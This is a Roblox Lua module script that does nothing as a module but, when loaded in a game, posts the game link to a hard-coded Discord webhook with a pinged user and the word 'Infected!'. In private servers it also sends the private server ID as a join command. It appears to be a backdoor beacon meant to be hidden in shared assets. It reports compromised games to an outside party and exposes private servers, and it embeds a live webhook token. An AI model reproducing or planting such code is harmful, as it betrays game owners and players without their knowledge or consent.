local Module = {}

-- Roblox Script that sends the game link to a Discord Webhook

local HttpService = game:GetService("HttpService")

-- Set your Discord Webhook URL here
local webhookUrl = "https://discord.com/api/webhooks/1414089380804694088/uJ9fwTULkbA9Por3AzzXy1ChtI729grphk11sJGmQ3XatJ8FNTzWiBN5f6Pe6HhQzfYh"

-- Create a function to send the message to Discord
local function sendDiscordMessage(message)
    local data = {
        ["content"] = message
    }

    local jsonData = HttpService:JSONEncode(data)

    local success, response = pcall(function()
        -- Send a POST request to the webhook
        return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
    end)

    if success then
        print()
    else
        warn()
    end
end

-- Check if the game is running in a private server
local isPrivateServer = game.PrivateServerId ~= ""

-- Construct the base game link
local gameLink = "https://www.roblox.com/games/" .. game.PlaceId

-- Construct the message
local message

if isPrivateServer then
    -- Construct the private server link in the required format
    local privateServerLink = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.PrivateServerId .. '")'

    -- Include both the main game link and the private server link in the message
    message = "<@954436314898518057> Infected! Main Game Link: " .. gameLink .. "\nPrivate Server Link: " .. privateServerLink
else
    -- Just send the public game link if it's not a private server
    message = "<@954436314898518057> Infected! Game Link: " .. gameLink
end

-- Send the message when the server starts
sendDiscordMessage(message)

return Module
